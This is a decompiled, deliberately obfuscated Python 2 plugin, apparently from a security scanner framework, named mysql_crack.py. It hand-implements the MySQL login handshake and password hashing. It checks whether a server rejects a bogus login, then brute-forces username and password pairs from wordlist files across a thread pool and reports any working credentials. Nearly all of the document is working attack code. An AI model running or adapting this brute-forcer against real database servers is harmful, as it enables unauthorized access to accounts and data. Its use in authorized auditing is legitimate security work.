# Embedded file name: mysql_crack.py
try:
    import hashlib

    OO0o = lambda *Oo0Ooo, **O0O0OO0O0O0: hashlib.new("sha1", *Oo0Ooo, **O0O0OO0O0O0)
except ImportError:
    import sha

    OO0o = sha.new

import socket
import struct
import sys

try:
    import cStringIO as StringIO
except ImportError:
    import StringIO

I1IiI = False
O00ooOO = 1
I1iII1iiII = 2
iI1Ii11111iIi = 4
i1i1II = 8
O0oo0OO0 = 16
I1i1iiI1 = 32
iiIIIII1i1iI = 64
o0oO0 = 128
oo00 = 256
sys_debug_yes_no = 512
debug_key = 1024
Multiprocessing_RLock = 2048
Login_Get = 4096
oOOoo00O0O = 8192
i1111 = 32768
i11 = 65536
I11 = 131072
Oo0o0000o0o0 = O00ooOO | iI1Ii11111iIi | oOOoo00O0O | sys_debug_yes_no | i1111
oOo0oooo00o = 16777215


class O0OoOoo00o(Exception):
    def __init__(self, code, msg=None):
        self.code = code
        self.msg = msg

    def __str__(self):
        return repr(self.msg)


def i1iIIi1(b):
    if isinstance(b, int):
        return b
    else:
        return struct.unpack("!B", b)[0]


def ooO0O(i):
    return struct.pack("!B", i)


def iIiI1I11(bs):
    if len(bs) == 0:
        return ""
    else:
        oO = bs[0]
        for OO0OOooOoO0Oo in bs[1:]:
            oO += OO0OOooOoO0Oo

        return oO


def iiIiIiIi(data):
    def O00oooo0O(data):
        if i1iIIi1(data) >= 65 and i1iIIi1(data) <= 122:
            return data
        return "."

    print "packet length %d" % len(data)
    print "method call[1]: %s" % sys._getframe(1).f_code.co_name
    print "\x6d\x65\x74\x68\x6f\x64\x20\x63\x61\x6c\x6c\x5b\x32\x5d\x3a\x20\x25\x73" % sys._getframe(2).f_code.co_name
    print "method call[3]: %s" % sys._getframe(3).f_code.co_name
    print "method call[4]: %s" % sys._getframe(4).f_code.co_name
    print "" * 88
    II1i1Ii11Ii11 = [data[iII11i:iII11i + 16] for iII11i in xrange(len(data)) if iII11i % 16 == 0]
    for O0O00o0OOO0 in II1i1Ii11Ii11:
        print " ".join(map(lambda Ii1iIIIi1ii: "%02X" % i1iIIi1(Ii1iIIIi1ii), O0O00o0OOO0)) + "   " * (
        16 - len(O0O00o0OOO0)) + " " * 2 + " ".join(map(lambda Ii1iIIIi1ii: "%s" % O00oooo0O(Ii1iIIIi1ii), O0O00o0OOO0))

    print "" * 88
    print ""


def iiI1(password, message):
    if password == None or len(password) == 0:
        return ooO0O(0)
    else:
        if I1IiI:
            print "password=" + password
        i11Iiii = OO0o(password).digest()
        iI = OO0o(i11Iiii).digest()
        I1i1I1II = OO0o()
        I1i1I1II.update(message)
        I1i1I1II.update(iI)
        i1IiIiiI = I1i1I1II.digest()
        return I1I(i1IiIiiI, i11Iiii)


def I1I(message1, message2):
    OOO00 = len(message1)
    i1IiIiiI = struct.pack("B", OOO00)
    for iII11i in xrange(OOO00):
        Ii1iIIIi1ii = struct.unpack("B", message1[iII11i:iII11i + 1])[0] ^ \
                      struct.unpack("B", message2[iII11i:iII11i + 1])[0]
        i1IiIiiI += struct.pack("B", Ii1iIIIi1ii)

    return i1IiIiiI


I1II1III11iii = 8


class iiii11I(object):
    def __init__(self, seed1, seed2):
        self.max_value = 1073741823L
        self.seed1 = seed1 % self.max_value
        self.seed2 = seed2 % self.max_value

    def my_rnd(self):
        self.seed1 = (self.seed1 * 3L + self.seed2) % self.max_value
        self.seed2 = (self.seed1 + self.seed2 + 33L) % self.max_value
        return float(self.seed1) / float(self.max_value)


def IIIii1II1II(password, message):
    i1I1iI = oo0OooOOo0(password)
    o0O = oo0OooOOo0(message[:I1II1III11iii])
    O00oO = struct.unpack(">LL", i1I1iI)
    I11i1I1I = struct.unpack(">LL", o0O)
    iIIIIii1 = iiii11I(O00oO[0] ^ I11i1I1I[0], O00oO[1] ^ I11i1I1I[1])
    oo000OO00Oo = StringIO.StringIO()
    for O0OOO0OOoO0O in xrange(min(I1II1III11iii, len(message))):
        oo000OO00Oo.write(ooO0O(int(iIIIIii1.my_rnd() * 31) + 64))

    O00Oo000ooO0 = ooO0O(int(iIIIIii1.my_rnd() * 31))
    OoO0O00 = oo000OO00Oo.getvalue()
    oo000OO00Oo = StringIO.StringIO()
    for IIiII in OoO0O00:
        oo000OO00Oo.write(ooO0O(i1iIIi1(IIiII) ^ i1iIIi1(O00Oo000ooO0)))

    return oo000OO00Oo.getvalue()


def oo0OooOOo0(password):
    IIi = 1345345333L
    i11iIIIIIi1 = 7L
    iiII1i1 = 305419889L
    for IIiII in [i1iIIi1(Ii1iIIIi1ii) for Ii1iIIIi1ii in password if Ii1iIIIi1ii not in (" ", "\t")]:
        IIi ^= ((IIi & 63) + i11iIIIIIi1) * IIiII + (IIi << 8) & 4294967295L
        iiII1i1 = iiII1i1 + (iiII1i1 << 8 ^ IIi) & 4294967295L
        i11iIIIIIi1 = i11iIIIIIi1 + IIiII & 4294967295L

    OO0O0OoOO0 = IIi & 2147483647L
    iiiI1I11i1 = iiII1i1 & 2147483647L
    return struct.pack(">LL", OO0O0OoOO0, iiiI1I11i1)


def I1ii11iI(n):
    return struct.pack("BBB", n & 255, n >> 8 & 255, n >> 16 & 255)


def iII(n):
    return struct.unpack("<H", n[0:2])[0]


def I1iiIii(n):
    return struct.unpack("B", n[0])[0] + (struct.unpack("B", n[1])[0] << 8) + (struct.unpack("B", n[2])[0] << 16)


def III1iII1I1ii(n):
    return struct.unpack("B", n[0])[0] + (struct.unpack("B", n[1])[0] << 8) + (struct.unpack("B", n[2])[0] << 16) + (
    struct.unpack("B", n[3])[0] << 24)


def O0oOoOOOoOO(n):
    return struct.unpack("B", n[0])[0] + (struct.unpack("B", n[1])[0] << 8) + (struct.unpack("B", n[2])[0] << 16) + (
    struct.unpack("B", n[3])[0] << 24) + (struct.unpack("B", n[4])[0] << 32) + (struct.unpack("B", n[5])[0] << 40) + (
           struct.unpack("B", n[6])[0] << 48) + (struct.unpack("B", n[7])[0] << 56)


class OOOo00oo0oO(object):
    def __init__(self, socket):
        self.__position = 0
        self.__recv_packet(socket)
        del socket

    def __recv_packet(self, socket):
        III1Iiii1I11 = socket.recv(4)
        while len(III1Iiii1I11) < 4:
            O0O00o0OOO0 = socket.recv(4 - len(III1Iiii1I11))
            if len(O0O00o0OOO0) == 0:
                raise O0OoOoo00o(2013, "Lost connection to MySQL server during query")
            III1Iiii1I11 += O0O00o0OOO0

        if I1IiI:
            iiIiIiIi(III1Iiii1I11)
        o00oooO0Oo = III1Iiii1I11[:3]
        self.__packet_number = i1iIIi1(III1Iiii1I11[3])
        IIi1i = o00oooO0Oo + ooO0O(0)
        OOOO00O0O = struct.unpack("<I", IIi1i)[0]
        OoOO = []
        while OOOO00O0O > 0:
            ooOOO0 = socket.recv(OOOO00O0O)
            if len(ooOOO0) == 0:
                raise O0OoOoo00o(2013, "Lost connection to MySQL server during query")
            if I1IiI:
                iiIiIiIi(ooOOO0)
            OoOO.append(ooOOO0)
            OOOO00O0O -= len(ooOOO0)

        self.__data = iIiI1I11(OoOO)

    def packet_number(self):
        return self.__packet_number

    def get_all_data(self):
        return self.__data

    def read(self, size):
        i1IiIiiI = self.peek(size)
        self.advance(size)
        return i1IiIiiI

    def read_all(self):
        i1IiIiiI = self.__data[self.__position:]
        self.__position = None
        return i1IiIiiI

    def advance(self, length):
        ooO0oOOooOo0 = self.__position + length
        if ooO0oOOooOo0 < 0 or ooO0oOOooOo0 > len(self.__data):
            raise Exception("Invalid advance amount (%s) for cursor.  Position=%s" % (length, ooO0oOOooOo0))
        self.__position = ooO0oOOooOo0

    def rewind(self, position=0):
        if position < 0 or position > len(self.__data):
            raise Exception("Invalid position to rewind cursor to: %s." % position)
        self.__position = position

    def peek(self, size):
        i1IiIiiI = self.__data[self.__position:self.__position + size]
        if len(i1IiIiiI) != size:
            OO = "Result length not requested length:\nExpected=%s.  Actual=%s.  Position: %s.  Data Length: %s" % (
            size,
            len(i1IiIiiI),
            self.__position,
            len(self.__data))
            if I1IiI:
                print OO
                self.dump()
            raise AssertionError(OO)
        return i1IiIiiI

    def get_bytes(self, position, length=1):
        return self.__data[position:position + length]

    def is_ok_packet(self):
        return i1iIIi1(self.get_bytes(0)) == 0

    def is_eof_packet(self):
        return i1iIIi1(self.get_bytes(0)) == 254

    def is_resultset_packet(self):
        o0oOO000oO0oo = i1iIIi1(self.get_bytes(0))
        return o0oOO000oO0oo >= 1 and o0oOO000oO0oo <= 250

    def is_error_packet(self):
        return i1iIIi1(self.get_bytes(0)) == 255

    def check_error(self):
        if self.is_error_packet():
            self.rewind()
            self.advance(1)
            oO0o0 = iII(self.read(2))
            if I1IiI:
                print "errno = %d" % oO0o0
            iI1Ii11iIiI1 = self.__data
            oO0o0 = struct.unpack("<h", iI1Ii11iIiI1[1:3])[0]
            if iI1Ii11iIiI1[3] == "#":
                oOOoo00O00o = iI1Ii11iIiI1[4:9].decode("utf8")
                O0O00Oo = iI1Ii11iIiI1[9:].decode("utf8")
            else:
                oOOoo00O00o = None
                O0O00Oo = iI1Ii11iIiI1[3:].decode("utf8")
            raise O0OoOoo00o(oO0o0, O0O00Oo)

    def dump(self):
        iiIiIiIi(self.__data)


class oo(object):
    def __init__(self, host=None, user=None, passwd=None, db=None, port=3306, timeout=10):
        self.host = host
        self.port = port
        self.user = user
        self.password = passwd
        self.db = db
        self.unix_socket = None
        self.charset = "latin1"
        self.use_unicode = False
        oO0o0o0oo = Oo0o0000o0o0
        oO0o0o0oo |= i11
        if self.db:
            oO0o0o0oo |= i1i1II
        self.client_flag = oO0o0o0oo
        self.timeout = timeout
        self._connect()

    def close(self):
        iiI11ii1I1 = 1
        Ooo0OOoOoO0 = struct.pack("<i", 1) + ooO0O(iiI11ii1I1)
        self.socket.send(Ooo0OOoOoO0)
        self.socket.close()
        self.socket = None

    def _connect(self):
        try:
            if self.unix_socket and (self.host == "localhost" or self.host == "127.0.0.1"):
                oOOoO0o0oO = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                oOOoO0o0oO.settimeout(self.timeout)
                oOOoO0o0oO.connect(self.unix_socket)
                self.host_info = "Localhost via UNIX socket"
                if I1IiI:
                    print "connected using unix_socket"
            else:
                oOOoO0o0oO = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                oOOoO0o0oO.settimeout(self.timeout)
                oOOoO0o0oO.connect((self.host, self.port))
                self.host_info = "socket %s:%d" % (self.host, self.port)
                if I1IiI:
                    print "connected using socket"
            self.socket = oOOoO0o0oO
            self._get_server_information()
            self._send_authentication()
        except socket.error as o0Oo0oO0oOO00:
            raise O0OoOoo00o(2003, "Can\'t connect to MySQL server on %r (%d)" % (self.host, o0Oo0oO0oOO00.args[0]))

    def _send_authentication(self):
        oOOoO0o0oO = self.socket
        self.client_flag |= Oo0o0000o0o0
        if self.server_version.startswith("5"):
            self.client_flag |= I11
        if self.user is None:
            raise ValueError, "Did not specify a username"
        oooO = 8
        self.user = self.user.encode(self.charset)
        o00Oo0oooooo = struct.pack("<i", self.client_flag) + struct.pack("<I", 1) + ooO0O(oooO) + ooO0O(0) * 23
        oo0 = 1
        iI1Ii11iIiI1 = o00Oo0oooooo + self.user + ooO0O(0) + iiI1(self.password.encode(self.charset), self.salt)
        if self.db:
            self.db = self.db.encode(self.charset)
            iI1Ii11iIiI1 += self.db + ooO0O(0)
        iI1Ii11iIiI1 = I1ii11iI(len(iI1Ii11iIiI1)) + ooO0O(oo0) + iI1Ii11iIiI1
        oo0 += 2
        if I1IiI:
            iiIiIiIi(iI1Ii11iIiI1)
        oOOoO0o0oO.send(iI1Ii11iIiI1)
        o0OoOo00o0o = OOOo00oo0oO(oOOoO0o0oO)
        o0OoOo00o0o.check_error()
        if I1IiI:
            o0OoOo00o0o.dump()
        if o0OoOo00o0o.is_eof_packet():
            iI1Ii11iIiI1 = IIIii1II1II(self.password.encode(self.charset), self.salt.encode(self.charset)) + ooO0O(0)
            iI1Ii11iIiI1 = I1ii11iI(len(iI1Ii11iIiI1)) + ooO0O(oo0) + iI1Ii11iIiI1
            oOOoO0o0oO.send(iI1Ii11iIiI1)
            o0OoOo00o0o = OOOo00oo0oO(oOOoO0o0oO)
            o0OoOo00o0o.check_error()
            if I1IiI:
                o0OoOo00o0o.dump()

    def _get_server_information(self):
        oOOoO0o0oO = self.socket
        iII11i = 0
        i1OOO0000oO = OOOo00oo0oO(oOOoO0o0oO)
        iI1Ii11iIiI1 = i1OOO0000oO.get_all_data()
        if I1IiI:
            iiIiIiIi(iI1Ii11iIiI1)
        self.protocol_version = i1iIIi1(iI1Ii11iIiI1[iII11i:iII11i + 1])
        iII11i += 1
        IiIi1I1 = iI1Ii11iIiI1.find(ooO0O(0), iII11i)
        self.server_version = iI1Ii11iIiI1[iII11i:IiIi1I1].decode(self.charset)
        iII11i = IiIi1I1 + 1
        self.server_thread_id = struct.unpack("<h", iI1Ii11iIiI1[iII11i:iII11i + 2])
        iII11i += 4
        self.salt = iI1Ii11iIiI1[iII11i:iII11i + 8]
        iII11i += 9
        if len(iI1Ii11iIiI1) >= iII11i + 1:
            iII11i += 1
        self.server_capabilities = struct.unpack("<h", iI1Ii11iIiI1[iII11i:iII11i + 2])[0]
        iII11i += 1
        self.server_language = i1iIIi1(iI1Ii11iIiI1[iII11i:iII11i + 1])
        self.server_charset = self.server_language
        iII11i += 16
        if len(iI1Ii11iIiI1) >= iII11i + 12 - 1:
            iII1i1 = iI1Ii11iIiI1[iII11i:iII11i + 12]
            self.salt += iII1i1

    def get_server_info(self):
        return self.server_version


o00O = None
i1Ii1i1I11Iii = None


def craft(arg):
    global i1Ii1i1I11Iii
    global o00O
    OoO0O00O0oo0O, I1IiI11, iI1iiiiIii, iIiIiIiI, i11OOoo = arg
    for iII11i in range(10):
        try:
            debug("[+%02d] mysql://%s:%s@%s:%d/", iII11i, iIiIiIiI, i11OOoo, I1IiI11, iI1iiiiIii)
            IIiII = oo(host=I1IiI11, port=iI1iiiiIii, user=iIiIiIiI, passwd=i11OOoo)
            IIiII.close()
            i1Ii1i1I11Iii = i11OOoo or "<empty>"
            o00O = iIiIiIiI
            OoO0O00O0oo0O.stop()
        except O0OoOoo00o as o0Oo0oO0oOO00:
            if o0Oo0oO0oOO00.code == 1045:
                break
        except Exception as o0Oo0oO0oOO00:
            if I1IiI:
                print o0Oo0oO0oOO00


def assign(service, arg=None):
    if service == '''mysql''':
        return (True, arg)


def audit(arg):
    I1IiI11, iI1iiiiIii = arg
    i1iI1 = False
    try:
        IIiII = oo(host=I1IiI11, port=iI1iiiiIii, user="neveruseduser", passwd="neverusedpass")
        IIiII.close()
    except O0OoOoo00o as o0Oo0oO0oOO00:
        if o0Oo0oO0oOO00.code == 1045:
            i1iI1 = True
    except Exception as o0Oo0oO0oOO00:
        pass

    if not i1iI1:
        return
    OoO0O00O0oo0O = ThreadPool(10,craft)
    o00o0 = util.load_password_dict(I1IiI11, "database/mysql_user.txt", "database/mysql_pass.txt")
    for II1I in o00o0:
        OoO0O00O0oo0O.push((OoO0O00O0oo0O,
                                    I1IiI11,
                                    iI1iiiiIii,
                                    II1I[0],
                                    II1I[1]))

    OoO0O00O0oo0O.run()
    if o00O:
        security_hole("%s:%d mysql password is %s/%s" % (I1IiI11, iI1iiiiIii, o00O, i1Ii1i1I11Iii))


if __name__ == '__main__':
    from dummy import *
    import threadpool

    audit(assign('''mysql''', ("127.0.0.1", 3306))[1])

    # KEY---24000815b2f04e2f070d02f649539c6c6330a1bc45ad798962466966b7a220a4---
